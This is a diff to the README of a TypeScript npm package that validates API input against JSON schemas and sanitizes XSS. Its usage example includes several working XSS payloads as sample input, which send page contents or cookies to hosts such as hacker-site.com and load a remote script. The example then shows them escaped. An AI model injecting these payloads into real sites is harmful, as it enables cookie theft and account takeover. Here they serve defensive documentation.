@@ -6,7 +6,7 @@
   <img alt="Documentation" src="https://img.shields.io/badge/documentation-yes-brightgreen.svg" />
 </a>
 <a href="https://github.com/marinrusu1997/thermopylae/blob/master/LICENSE" target="_blank">
-  <img alt="License: ISC" src="https://img.shields.io/badge/License-MIT-yellow.svg" />
+  <img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg" />
 </a>
 </p>
 
@@ -19,10 +19,92 @@ npm install @thermopylae/lib.api-validator
 
 ## Description
 This package allows you to validate user input used by API Services.
-Validation is performed against JSON schema and XSS injections.
+Validation is performed against JSON schema and XSS injections. <br/>
+Detailed information can be found in the API Doc of the [ApiValidator][api-validator-link] class.
 
 ## Usage
+Assuming you have a directory structure as described [here][api-validator-init-link], 
+let's look at an example of how this package can be used.
+Supposing we have the following schemas:
+```text
+└─ schemas
+    └─ authentication-service
+    │ ├─ login.json
+    │ └─ logout.json
+    ├─ book-service
+    │ ├─ create.json
+    │ ├─ read.json
+    │ └─ delete.json
+    └─ core
+      └─ commons.json
+```
+We can perform validation in the following manner:
+```typescript
+import { ApiValidator, ValidationError } from '@thermopylae/lib.api-validator';
 
+(async function main() {
+    /* Perform initialization */
+    const validator = new ApiValidator();
+    // assuming schemas from 'core' folder are referenced by schemas from other service folders
+    await validator.init('./schemas', ['core']);
+    
+    /* Successfull Scenario */
+    let validData = {
+        username: 'username',
+        password: 'password'
+    };
+    // schema has id: #AUTHENTICATION_SERVICE-LOGIN
+    validData = await validator.validate('AUTHENTICATION_SERVICE', 'LOGIN', validData);
+    
+    /* Error Scenario */
+    try {
+        let invalidData = {
+            nameeee: 'Les Trois Mousquetaires',
+            author: 'Alexandre Dumas'
+        };
+        invalidData = await validator.validate('BOOK_SERVICE', 'CREATE', invalidData);
+    } catch (e) {
+        if (e instanceof ValidationError) {
+            console.error(validator.joinErrors(e.errors, 'text'));
+            console.error(validator.joinErrors(e.errors, 'json'));
+        }
+        throw e;
+    }
+    
+    /* XSS sanitization */
+    const jsonWithXss = {
+        // XSS Attack: steal sensitive information
+        name: '<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML</script>',
+        // XSS Attack: Steal user cookie
+        surname: "<script>document.write('<img src=\"https://hacker-site.com/collect.gif?cookie=' + document.cookie + '\" />')</script>",
+        // XSS Attack: Execute hacker script
+        age: 'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">',
+        // assuming this prop was added by some of your interceptors
+        origin: {
+            ip: '127.0.0.1'
+        }
+    };
+    validator.sanitize(jsonWithXss, new Set(['origin.ip']));
+    /**
+     * After sanitization it will look like this:
+     * {
+     *   name: '&lt;script&gt;new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML&lt;/script&gt;',
+     *   surname: `&lt;script&gt;document.write('<img src="https://hacker-site.com/collect.gif?cookie=' + document.cookie + '" />')&lt;/script&gt;`,
+     *   age: 'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script src="http://192.168.149.128/xss.js"&gt;',
+     *   origin: {
+     *       ip: '127.0.0.1'
+     *   }
+     * }
+     */
+    
+    let stringWithXSS = '<button onclick=\'document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie\'></button>';
+    stringWithXSS = validator.sanitize(stringWithXSS);
+    /**
+     * After sanitization it will look like this:
+     * '&lt;button onclick=\'document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie\'&gt;&lt;/button&gt;'
+     */
+})();
+```
 
 ## API Reference
 API documentation is available [here][api-doc-link].
@@ -47,3 +129,5 @@ Copyright © 2021 [Rusu Marin](https://github.com/marinrusu1997). <br/>
 This project is [MIT](https://github.com/marinrusu1997/thermopylae/blob/master/LICENSE) licensed.
 
 [api-doc-link]: https://marinrusu1997.github.io/thermopylae/lib.api-validator/index.html
+[api-validator-link]: https://marinrusu1997.github.io/thermopylae/lib.api-validator/classes/apivalidator.html
+[api-validator-init-link]: https://marinrusu1997.github.io/thermopylae/lib.api-validator/classes/apivalidator.html#init
